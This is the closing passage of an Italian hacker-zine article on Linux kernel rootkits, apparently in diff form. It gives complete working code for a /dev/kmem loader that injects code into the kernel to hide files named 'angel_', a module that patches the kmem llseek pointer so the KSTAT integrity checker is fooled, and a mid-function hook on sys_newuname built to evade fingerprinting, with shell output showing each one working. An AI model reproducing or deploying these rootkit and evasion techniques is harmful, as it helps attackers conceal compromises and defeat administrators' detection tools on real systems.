+                 unsigned char   opcodes2[2];   \
+          } __attribute__((packed)); \
+          static struct s_##nome f_##nome = \
+                 {{0xe8, sizeof(f_##nome.dimensione) & 0xff,\
+                  (sizeof(f_##nome.dimensione) >> 8) & 0xff,\
+                  (sizeof(f_##nome.dimensione) >> 16) & 0xff,\
+                  (sizeof(f_##nome.dimensione) >> 24) & 0xff  },\
+                  {valori},                  \
+                  {0x58, 0xc3}\
+          };          \
+          static inline tipo *nome(void) \
+          {                       \
+                  tipo *(*func)() = (void *) &f_##nome; \
+                  return func();  \
+          }
+#define R_VAR(tipo, nome, valori)   \
+        RELOC(tipo, 1, nome, valori)
+ 
+#define S_VAR(nome, valori) \
+        RELOC(char ,sizeof(valori),nome,valori)
+
+/* Saranno nascosti tutti i file inizianti con la sottostringa "angel_" */
+ S_VAR(hide,"angel_");
+<-X->
+
+Non penso ci siano bisogno ulteriori commenti.
+Ora il codice del "loader" in memoria
+
+<-| LKEPD/charger.c |->
+/* charger.c */
+
+#include "eclipse.h"
+ 
+extern void init(unsigned long,unsigned long); /* Ovvero la funzione di init
+                                                  di data.c */
+
+S_VAR(skmem,"/dev/kmem");
+S_VAR(error,"Uops, errore :(\n");
+#define ERROR   { write(1,error(),16);m_exit(-1);}
+/* Read and check error */
+#define R_C_E(fd,offset,dove,quanto)   if(rkm(fd,offset,dove,quanto)<0) ERROR
+/* Write and check error */
+#define W_C_E(fd,offset,dove,quanto)   if(wkm(fd,offset,dove,quanto)<0) ERROR
+
+int main(void);
+void _start(void){ main(); m_exit(0); };
+ 
+int main(void)
+{
+       int kmem = open(skmem(),O_RDWR,S_IRWXU);
+       unsigned long uname_addr,
+	              kmalloc=A_KMALLOC,
+	              kernel_mem,
+	              hooksizes=(HOOKS*sizeof(struct hook))+
+		                   (sizeof(struct pointer)*POINTERS),
+	              start_addr;
+	if(kmem<0)
+	     ERROR
+	
+        /* Leggiamo e salviamo l'indirizzo originale della olduname */
+	R_C_E(kmem,A_SCT+(__NR_olduname*4),&uname_addr,sizeof(uname_addr))
+	
+	/* Lo sovrascriviamo con quello della kmalloc */
+	W_C_E(kmem,A_SCT+(__NR_olduname*4),&kmalloc,sizeof(kmalloc))
+        
+	/* Allochiamo */
+	kernel_mem=KMALLOC((unsigned long)code_end-(unsigned long)code_start+
+       	                                                hooksizes,GFP_KERNEL);
+        
+	if((void*)kernel_mem==NULL)
+	     ERROR
+        /* Copiamo il nostro codice in memoria */
+        W_C_E(kmem,kernel_mem+hooksizes,(char*)code_start,
+	                     (unsigned long)code_end-(unsigned long)code_start)
+	
+        /* Calcoliamo l'indirizzo dell'init */
+        start_addr=kernel_mem+hooksizes+(unsigned long)init-
+	                                            (unsigned long)code_start;
+
+ 	/* Scriviamo l'indirizzo dell'init al posto della syscall */
+	W_C_E(kmem,A_SCT+(__NR_olduname*4),&start_addr,sizeof(start_addr))
+        
+	/* Attiviamo la routine kernel space */
+        KSTART(kernel_mem,A_SCT);
+        
+	/* Ripristinamo il vecchio indirizzo nella sys call table */
+	W_C_E(kmem,A_SCT+(__NR_olduname*4),&uname_addr,sizeof(uname_addr))
+        
+	/* Abbiamo finito, usciamo */
+	m_exit(0);
+} 
+<-X->
+
+Ed infine il codice che andra` a risiedere nella memoria kernel
+
+<-| LKEPD/eclipse.c |->
+#include "eclipse.h"
+ 
+asm (".globl code_start\n\t" ".globl code_end\n\t");
+
+/* Faremo puntare questi puntatori rispettivamente alla zona di memoria
+   dedicata all'injection ed a quella dedicata al backup, cosi` da potervici
+   accedere da qualsiasi funzione
+ */
+R_VAR(unsigned long *, backup_fill, 0);
+R_VAR(unsigned long *, inj_code_fill, 0);
+
+int n_filldir64(void *buf,char *nome,int length,unsigned long off,long inode,
+                   unsigned int tipo)
+{
+   int   len = 0;
+   int   (**o_filldir) (void *, char *, int, unsigned long,long,unsigned int);
+       
+   /* Ora con *filldir si accede al puntatore "base" della struttura hook */
+   (o_filldir) = (void *) (7 + (unsigned long) *backup_fill());
+       
+   /* Facciamo puntare quel puntatore alla filldir64 oroginaria */
+   (*o_filldir) = (void *) FILLDIR64;
+      
+   /* Se il nome del file con cui e` stata chiamata la filldir deve essere
+      nascosto ritorniamo 0 altrimenti chiamiamo la funzione originaria
+    */
+   if (!my_strncmp(nome, hide(), my_strlen(hide())))
+          return 0;
+
+   /* Ripristiniamo i bytes originari per poterla chiamare */
+   m_memcpy((char *) FILLDIR64,(char*) *backup_fill(), 7);
+
+   len = (**o_filldir) (buf, nome, length, off, inode, tipo);
+
+   /* Risistemiamo l'hook */
+   m_memcpy((char *) FILLDIR64, (char*)*inj_code_fill(), 7);
+
+   return len;
+}
+
+void init(unsigned long base_mem,unsigned long sct) {
+
+unsigned char inj_fill[7] = "\xb8\x00\x00\x00\x00\xff\xe0";
+unsigned char b_fill[7];
+
+ /*  Faccio puntare i 2 puntatori alle rispettive zone della struttura hook */
+ 
+  *inj_code_fill()=(void*)+base_mem;
+  *backup_fill()=(void*)+7+base_mem;
+ 
+ /* Ricordiamoci che davanti al nostro codice ci sono le strutture per gli
+    hook */
+
+  *(unsigned long*)&inj_fill[1]=(unsigned long)n_filldir64-
+                  (unsigned long)code_start+base_mem+sizeof(struct hook)*HOOKS+
+		  sizeof(struct pointer)*POINTERS;
+				 
+/* Sistemiamo il codice per l'injection ed il backup nella struttura */
+   m_memcpy((char*)*inj_code_fill(),inj_fill,7);
+   m_memcpy((char*)*backup_fill(),(char*)FILLDIR64,7);
+ 
+/* Injectiamo il codice di salto */
+   m_memcpy((char*)FILLDIR64,inj_fill,7);
+}
+<-X->
+
+Finito :)
+
+Compiliamo con questo...
+
+<-| LKEPD/eclipse.sh |->
+#!/bin/bash
+echo ".text" > eclipse.s
+echo "code_start:" >> ecplipse.s
+gcc -S -nostdlib -O2 eclipse.c -o - | grep -vE \
+"\.align|\.p2align|\.text|\.data|\.rodata|#|\.ident|\.file|\.version|\.note" \
+>> eclipse.s
+echo "code_end:" >> eclipse.s
+gcc -nostdlib -c eclipse.s -o eclipse.o
+gcc -c -nostdlib -O3 charger.c -o charger.o
+gcc charger.o eclipse.o -o eclipse
+ 
+Vortex:~# ./eclipse
+Vortex:~# touch angel_dust
+Vortex:~# ls | grep angel_dust
+Vortex:~#
+
+Come avete visto la sua struttura e` parecchio flessibile, potete divertirvi ad
+espanderlo finche volete, anche se, chiaramente, ci sono modi molto piu`
+immediati di procedere, sta a voi la scelta :)
+
+
+SEZIONE VIII
+============
+
+- VIRTUAL FILE SYSTEM 
+
+Il virtual file system e` un layer del kernel che si occupa di gestire tutte
+le syscall legate ad un filesystem.
+Il VFS consente di gestire gli accessi agli inode, astraendo dal tipo di
+filesystem su cui l'inode risiede ed indipendentemente dal tipo di file, sia
+esso socket, device, ascii od altro. Questo e` ottenuto mediante la creazione
+di un modello comune di file rappresentato da una struct file nella quale, tra
+le altre cose, vengono memorizzate dal kernel le informazioni riguardo alle
+funzioni che devono essere utilizzate per lavorare col filesystem sul quale il
+file in esame risiede.
+Cio` fa si` che quando ad esempio noi compiamo una qualsiasi operazione su un
+file utilizzando le syscall, il kernel individui automaticamente quali sono le
+funzioni reali da chiamare, dandoci l'illusione che sia la syscall "pura" a
+sobbarcarsi tutto il lavoro, lasciandoci cosi` una comoda interfaccia per
+lavorare con qualsiasi tipo di filesystem.
+Chiaramente noi non vedremo tutta la struttura del virtual file system di
+linux, lo esamineremo solo quel tanto che basta per poterne abusare. [1]
+In realta` abbiamo gia` visto un esempio di modifica del VFS, ovvero quando
+abbiamo parlato di proc, ma ora estendermo questo discorso anche agli altri
+filesystems.
+Ora dovremo andare ad intercettare le funzioni che il kernel utilizza per
+lavorare con un file su un certo filesystem, e lo faremo andando a modificare
+i puntatori a funzione che sono memorizzati all'interno della struct file. 
+
+- COME BYPASSARE I SECURITY TOOL BASATI SULL'ANALISI DI FILES (KMEM)
+
+Fino ad ora vi ho mostrato come attaccare un sistema nei modi piu svariati, ma
+ora vedremo un'applicazione di un hack al VFS per la nostra autodifesa: come
+bypassare KSTAT. [2]
+Mettiamo di aver creato un modulo che hijacka la sys_call_table, uno come
+quello che vi ho mostrato in una delle sezioni precedenti, vediamo come
+nascondere questo hijack agli occhi di KSTAT.
+Innanzitutto guardiamo come lavora:
+
+int check_sct()
+{
+        int kd;
+        char sch_code[100], *buf;
+        kd=open(KMEM, O_RDONLY);
+        printf("\nLegal sys_call_table should be at 0x%x ...", SYS_CALL_TABLE);
+        kread(kd, sc_addr, sch_code, 100);
+        buf = (char *) memmem(sch_code, 100, "\xff\x14\x85", 3);
+        sct = *(unsigned *)(buf+3);
+        if(sct == SYS_CALL_TABLE) {
+           printf(" OK!\n");
+           close(kd);
+           return 0;
+        }
+        else {
+           printf(" WARNING! sys_call_table hijacked!\n\n");
+           printf("Checking sys_call_table array now at 0x%lx ...\n\n\n", sct);
+           close(kd);
+           return 1;
+        }
+        /* should not get here */
+        return 0;
+}
+
+Questa e` la funzione che controlla l'integrita` della funzione system_call,
+piuttosto semplice come potete vedere: apre kmem, legge 100 bytes e poi
+effettua un banale parsing sul valore della sys call table, esattamente come
+facciamo noi quando lo cerchiamo per modificarlo.
+Se poi il valore cosi` trovato e quello hardcodato non corrispondono eccoci
+individuati.
+Vediamo ora piu` in dettaglio la funzione kread:
+
+int kread(int des, unsigned long addr, void *buf, int len)
+{
+        int rlen;
+        if(lseek(des, (off_t)addr, SEEK_SET) == -1)
+                return -1;
+        if((rlen = read(des, buf, len)) != len)
+                return -1;
+        return rlen;
+}
+
+Questa e` semplicissima: si posiziona all'offset desiderato sul file descriptor
+(ovvero equivalente a kmem nel nostro caso) legge la quantita` di dati
+desiderata e poi ritorna. Sembrerebbe tutto solido... se non fosse per il fatto
+che kmem e` un file e pertanto attraverso il VFS possiamo controllarne il
+comportamento.
+Torniamo un attimo indietro alla struttura del VFS: la struct file contiene un
+campo molto interessante chiamato f_op che e` un puntatore ad una struttura di
+tipo file_operations. Vediamola:
+
+struct file_operations {
+        struct module *owner;
+        /* Aggiorna la posizione nel file */
+        loff_t (*llseek) (struct file *, loff_t, int);
+        /* Legge size_t bytes a partire da loff_t, *l_off (che di solito
+           rappresenta la posizione all'interno del file) e` poi incrementato
+	 */
+        ssize_t (*read) (struct file *, char *, size_t, loff_t *);
+	/* Come sopra, solo che scrive */
+        ssize_t (*write) (struct file *, const char *, size_t, loff_t *);
+        /* Ritorna la prossima directory-entry di una directory in void,
+        filldir contiene l'indirizzo di una funzione ausiliaria che viene
+        utilizzata per estrarre i campi da una directory-entry. Nel caso
+        volessimo nascondere dei files dovremmo modificare questo puntatore
+        e crearci una filldir ad hoc */
+        int (*readdir) (struct file *, void *, filldir_t);
+        unsigned int (*poll) (struct file *, struct poll_table_struct *);
+        int (*ioctl) (struct inode *, struct file *, unsigned int,
+	                 unsigned long);
+       int (*mmap) (struct file *, struct vm_area_struct *);
+       int (*open) (struct inode *, struct file *);
+       int (*flush) (struct file *);
+       int (*release) (struct inode *, struct file *);
+       int (*fsync) (struct file *, struct dentry *, int datasync);
+       int (*fasync) (int, struct file *, int);
+       int (*lock) (struct file *, int, struct file_lock *);
+       ssize_t (*readv) (struct file *, const struct iovec *, unsigned long,
+                        loff_t *);
+       ssize_t (*writev) (struct file *, const struct iovec *, unsigned long,
+                        loff_t *);
+       ssize_t (*sendpage) (struct file *, struct page *, int, size_t,
+                        loff_t *, int);
+       unsigned long (*get_unmapped_area)(struct file *, unsigned long,
+                        unsigned long, unsigned long, unsigned long);
+};
+
+Questa struttura memorizza i puntatori alle funzioni che vengono utilizzate
+per la "gestione" di un file... cosa che kmem e`.
+Percio` potremmo, ad esempio, modificare il puntatore alla funzione di
+lseeking, facendo in modo che se venga richiesto un lseek ad un certo indirizzo
+essa lo faccia ad un altro indirizzo. Cosi` facendo la kread di kstat
+salterebbe totalmente andando a leggere dove noi vogliamo, ovvero in un buffer
+appositamente creato per ingannarne il parsing :)
+
+<-| LKEPD/lseeker.c |->
+#define __KERNEL__
+#define MODULE
+
+#ifdef MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+
+#define TARGET "/dev/kmem"
+#define FORBIDD 0xc01079c8 /* Indirizzo di system_call */
+
+MODULE_LICENSE("GPL");
+
+typedef long long (*v_lseek) (struct file *, long long, int);
+v_lseek o_lseek;
+
+static unsigned char buffer[100]={0};
+
+int patch_vfs(const char *name,v_lseek *orig,v_lseek new)
+{
+        /* Accediamo alla struct file relativa a kmem */
+	struct file *file=filp_open(name,O_RDONLY,0);
+	if(!file)
+		return -1;
+	/* Salviamo il puntatore originario */
+	*orig=(v_lseek)file->f_op->llseek;
+	/* Sovrascriviamolo col nostro */
+	file->f_op->llseek=new;
+	/* "Chiudiamolo" pure, ormai il puntatore e` sovrascritto */
+	filp_close(file,0);
+	return 0;
+}
+
+int unpatch_vfs(const char *name,v_lseek orig)
+{
+	struct file *file=filp_open(name,O_RDONLY,0);
+	if(!file)
+		return -1;
+	file->f_op->llseek=orig;
+	filp_close(file,0);
+	return 0;
+}
+
+long long my_lseek(struct file *target,long long offset,unsigned int origin)
+{
+	if((unsigned long)offset==FORBIDD)
+		offset=(long long)&buffer;
+	
+	 return	o_lseek(target,offset,origin);
+
+}
+
+int init_module(void)
+{
+ 	/* Copia nel buffer i dati che kstat andra` a leggere */
+	memcpy(buffer,(void*)FORBIDD,sizeof(buffer));
+	return patch_vfs(TARGET,&o_lseek,(v_lseek)my_lseek);
+}
+ 
+int cleanup_module(void)
+{
+	return unpatch_vfs(TARGET,o_lseek);
+}
+<-X->
+
+ Vortex:~# insmod lseeker.o
+ Vortex:~# ./kstat -s 0
+
+ Legal system_call handler should be at 0xc01079c8 ... OK!
+
+ Legal sys_call_table should be at 0xc03762f8 ... OK!
+
+ No System Call Address Modified
+
+
+ Vortex:~# insmod hijack.o /* E` il modulo presentato qualche sezione fa */
+ Vortex:~# su angel
+ angel@Vortex:/root$ dmesg
+  Hello world
+  Hello world
+  Hello world
+  Hello world
+  Hello world
+  Hello world
+  Hello world
+ angel@Vortex:/root$ exit
+  exit
+ Vortex:~# ./kstat -s 0
+
+  Legal system_call handler should be at 0xc01079c8 ... OK!
+
+  Legal sys_call_table should be at 0xc03762f8 ... OK!
+
+  No System Call Address Modified
+
+
+ Vortex:~# rmmod lseeker
+ Vortex:~# ./kstat -s 0
+
+  Legal system_call handler should be at 0xc01079c8 ... OK!
+
+  Legal sys_call_table should be at 0xc03762f8 ... WARNING!
+                                                      sys_call_table hijacked!
+
+  Checking sys_call_table array now at 0xda0a7c00 ...
+
+
+
+  sys_getresgid32                 0xf9b4c0a0 WARNING! should be at 0xc012eeb0
+
+ Vortex:~# 
+ 
+Perfetto :)
+Ovviamente questo era solo un esempio, ma sulla sua falsa riga potete
+ingannare qualsiasi tool che si basi su questo tipo di controlli, in modo
+estremamente semplice.
+Nel caso in cui pero` il controllo venga effettuato direttamente a kernel
+space le cose non sono proprio cosi` semplici: poniamo il caso di dover
+hijackare una funzione attraverso la tecnica del salto, ma e` presente un
+modulo del sysadmin che ha un fingerprint dei primi bytes della funzione,
+percio` se li sovrascrivessimo verremmo scoperti. Tralasciando soluzioni
+banali come la rimozione del modulo "benigno", come potremmo fare?
+
+1) Potremmo cercare all'interno della memoria del modulo benigno con un
+   semplice pattern matching il fingerprint della funzione da hijackare e
+   modificarlo, ma nel caso venisse cifrato in un qualsiasi modo diventerebbe
+   estremamente laborioso questo tipo di approccio.
+
+2) Potremmo hijackare un'altra funzione per ottenere il medesimo risultato, ma
+   non sempre e` possibile.
+
+3) Potremmo hijackare la funzione... dall'interno, in modo da non modificare
+   nessuno dei bytes controllati.
+
+
+- RIDIREZIONE DI UNA FUNZIONE DAL SUO INTERNO
+
+Questa e` la variante della tecnica esposta nella sezione sulla redirezione di
+una qualsiasi funzione. Come gia` detto precedentemente, applicare questa
+variante necessita un notevole studio, in quanto andare a modificare un codice
+nel mezzo puo' essere causa di non pochi problemi dato che, ad esempio, non
+possiamo alterare in alcun modo i dati memorizzati se non vogliamo alterarne
+il funzionamento. Inoltre, ovviamente, la struttura di un hook di questo tipo
+dipende dalla sequenza delle istruzioni del codice che andiamo a modificare,
+percio` necessita ogni volta di un aggiustamento ad hoc per funzionare.
+La struttura e` abbastanza semplice:
+
+1) Saltiamo dal mezzo di un altro codice ad una nostra funzione.
+2) Eseguiamo quello che dobbiamo.
+3) Risaltiamo nel codice originario per far continuare la sua esecuzione.
+
+1 - Per effettuare questo dobbiamo utilizzare la tecnica del salto vista in
+    precedenza, ma con un piccolo accorgimento: prima sovrascrivevamo i primi
+    7 bytes della funzione selvaggiamente, ma adesso dobbiamo stare attenti a
+    non rompere nessuna istruzione del codice! Questo vuol dire che dobbiamo
+    trovare uno spazio di ALMENO 7 bytes per poter injectare il nostro codice,
+    ma potrebbe benissimo darsi che si debba salvarne piu` di 7. Vedremo
+    meglio in seguito comunque.
+
+2 - Non penso servano troppe spiegazioni per questo punto... :) Basta creare
+    una funzione del tipo void funzione(void) con all'interno il codice che ci
+    interessa eseguire.
+
+3 - Ecco la parte interessante. Non possiamo semplicemente far ritornare la
+    nostra funzione, ritorneremmo nel mezzo delle istruzioni sovrascritte
+    senza avere eseguito parte del codice del programma originario [ovvero i
+    bytes sovrascritti dal nostro mov/jmp], dobbiamo percio` eseguire quel
+    codice e risaltare nel mezzo del programma all'indirizzo contenente le
+    istruzioni immediatamente seguenti a quelle cha abbiamo
+    backuppato-eseguito. Non e` tutto pero`, c'e` ancora una cosa che dobbiamo
+    fare prima di far questo, ovvero ripristinare a mano lo stack frame.
+    All'inizio del preludio di una funzione troviamo questo codice:
+
+        Dump of assembler code for function main:
+        0x080487c0 <main+0>:    push   %ebp
+        0x080487c1 <main+1>:    mov    %esp,%ebp
+
+    Saltando via senza eseguire tutta la nostra funzione lo stack frame non
+    verrebbe ripristinato, percio` dovremo farlo manualmente attraverso
+    l'istruzione "leave".
+
+Vediamo un esempio, cosi` il tutto apparira` molto piu semplice: ora
+hijackeremo la sys_newuname.
+Innanzitutto ci serve un suo dump per vedere dove possiamo agganciarci:
+
+ Vortex:~# grep sys_newuname /usr/src/linux/System.map
+ c012f970 T sys_newuname
+ Vortex:~# ./xdump -f /dev/kmem -o 0xc012f970 -l 20 -d	[3]
+ OFFSET: 0xc012f970
+ LENGTH: 0x00000014
+
+ 0xc012f970: 83 EC 14                            sub     %esp, $0x14
+ 0xc012f973: 89 5C 24 0C                         mov      0C(%esp), %ebx
+ 0xc012f977: BB D4 91 37 C0                      mov     %ebx, $0xC03791D4
+ 0xc012f97c: 89 D8                               mov     %eax, %ebx
+ 0xc012f97e: 89 74 24 10                         mov      10(%esp), %esi
+ 0xc012f982: 31 F6                               xor     %esi, %esi
+ ...
+ ...
+
+Come possiamo vedere, subito dopo i primi 7 bytes abbiamo due mov che formano
+un blocco di esattamente 7 bytes, percio` se ci mettessimo li` non dovremmo
+memorizzare istruzioni extra. Se ad esempio fossero stati solo 6 al posto di
+7, avremmo dovuto includere nell'hook anche TUTTA l'istruzione seguente e
+cosi` via, fino ad avere uno spazio di 7 bytes.
+Ora vediamo un'implementazione di quanto detto fin'ora:
+ 
+<-| LKEPD/middlechain.c |->
+#define __KERNEL__
+#define MODULE
+#ifdef MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+ 
+#define CODESIZE 	7
+#define BACKUP_SIZE	7
+/* Indirizzo da cui inizieremo a backuppare ed a sovrascrivere */
+#define HOOKSTART	0xc012f977
+
+MODULE_LICENSE("GPL");
+/* \xbe\x90\x90\x90\x90\xff\xe6 e` una variante della tecnica del salto dove
+   invece di eax usiamo esi come registro. Ovviamente e` assolutamente
+   equivalente, ho utilizzato un altro registro perche` come possiamo vedere
+   all'indirizzo 0xc012f97c del dump il registro eax e` utilizzato, percio`
+   non posiamo sovrascriverne il valore
+ */
+unsigned static char buffer[BACKUP_SIZE+CODESIZE]="\x90\x90\x90\x90\x90\x90\x90"
+ 					  "\xbe\x90\x90\x90\x90\xff\xe6";
+							
+unsigned static char jumpbuf[CODESIZE]="\xbe\x90\x90\x90\x90\xff\xe6";
+ 
+void chain(void)
+{
+	printk("Hello world\n");
+        /* Ripristiniamo il precedente stack frame, eseguiamo i bytes
+           backuppati e risaltiamo nel codice originario
+         */
+	asm volatile("leave;jmp buffer");
+}
+
+int init_module(void)
+{
+        /* Memorizziamo il backup */
+	memcpy(buffer,(void*)HOOKSTART,BACKUP_SIZE);
+	/* Memorizziamo l'indirizzo di ritorno per poterci jumpare */
+        *(unsigned long *)&buffer[BACKUP_SIZE+1]=(unsigned long)HOOKSTART+
+	                                                          BACKUP_SIZE;
+   	/* Inseriamo l'indirizzo della nostra funzione */
+	*(unsigned long*)&jumpbuf[1]=(unsigned long)chain;
+        /* Sovrascriviamo la funzione originaria */
+	memcpy((void*)HOOKSTART,jumpbuf,CODESIZE);
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	memcpy((void*)HOOKSTART,buffer,BACKUP_SIZE);
+}
+<-X->
+
+ Vortex:~# insmod middlechain.o
+ Vortex:~# dmesg
+ Hello world
+ Vortex:~#
+
+Hook perfettamente riuscito :-)
+Sicuramente l'utilizzo di questo sistema diventa inutile nel momento in cui
+viene fatto un fingerprint/hash della funzione per intero, ma ovviamente
+questo non e` l'unico modo in cui questa puo' essere utilizzata :-)
+Per i tool che procedono in quel modo [4] ci sono altri sistemi, alcuni anche
+se in modo non esplicito ve li ho mostrati, altri no, ma questa e` una storia
+che non vi raccontero`, almeno per ora :-)
+
+ 
+Note:
+[1] Per una trattazione completa guardate Understanding Linux Kernel
+    2nd Edition
+[2] http://www.s0ftpj.org/tools/kstat24_v1.1-2.tgz
+[3] Ovviamente xdump e` un'utility scritta apposta, non vi sara` difficile
+    crearne una vostra utilizzando le libdisasm
+[4] Come "dilemma" ad esempio, che potete trovare su http://twiz.antifork.org
+
+
+- CONCLUSIONE
+
+Questo e` quanto, vi ho illustrato quelle che a mio avviso sono le tecniche
+migliori per realizzare questo genere di software, ma ora tocca a voi
+migliorarle, personalizzarle ed inventarne di nuove; avete gli strumenti per
+fare [quasi] qualsiasi cosa adesso, magari aggiungero` altro piu` avanti, per
+ora voi dovete solo imparare ad usare queste tecniche ricordandovi che niente
+e` occultabile al 100% o che un'accurata analisi non troverebbe: ovvero state
+in campana :)
+Sperando che il mio lavoro vi sia piaciuto vi saluto, a presto, bye :)
+
+
+- THANKS: All Antifork and #phrack.it guys :)
+
+
+- BIBLIOGRAFIA
+
+   http://www.phrack.org
+   http://www.antifork.org
+   https://www.s0ftpj.org
+   http://spacewalker.dyns.be
+   Linux Device Drivers
+   Understanding Linux Kernel 2nd edition
+
+
+================================================================================
+------------------------------------[ EOF ]-------------------------------------
+================================================================================
+
